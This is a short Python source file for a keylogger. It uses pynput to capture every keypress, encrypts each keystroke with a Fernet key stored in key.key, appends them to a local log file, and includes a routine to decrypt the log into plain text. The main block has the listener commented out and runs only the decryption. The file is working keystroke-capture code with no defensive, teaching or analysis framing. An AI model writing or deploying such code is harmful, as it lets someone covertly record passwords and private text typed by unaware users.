from pynput import keyboard
from cryptography.fernet import Fernet

log_file = 'encrypted_keystrokes.txt'
decrypted_log_file = 'decrypted_keystrokes.txt'

def on_press(key):
    try:
        keystroke = key.char
    except AttributeError:
        keystroke = str(key)

    encrypted_keystroke = encrypt_keystroke(keystroke)
    store_keystroke(encrypted_keystroke)

def encrypt_keystroke(keystroke):
    from cryptography.fernet import Fernet
    key = load_key()
    fernet = Fernet(key)
    return fernet.encrypt(keystroke.encode())

def store_keystroke(encrypted_keystroke):
    with open(log_file, 'ab') as f:
        f.write(encrypted_keystroke + b'\n')

def load_key():
    with open('key.key', 'rb') as key_file:
        return key_file.read()

def generate_key():
    from cryptography.fernet import Fernet
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

def decrypt_file():
    key = load_key()
    fernet = Fernet(key)
    
    with open(log_file, 'rb') as f:
        encrypted_data = f.readlines()
    
    with open(decrypted_log_file, 'w') as f:
        for line in encrypted_data:
            try:
                decrypted_keystroke = fernet.decrypt(line.strip())
                f.write(decrypted_keystroke.decode() + '\n')
            except Exception as e:
                print(f"Decryption error: {e}")


if __name__ == "__main__":
    # generate_key()  # Ensure to run this once to generate the key file
    # with keyboard.Listener(on_press=on_press) as listener:
        # listener.join()
    decrypt_file()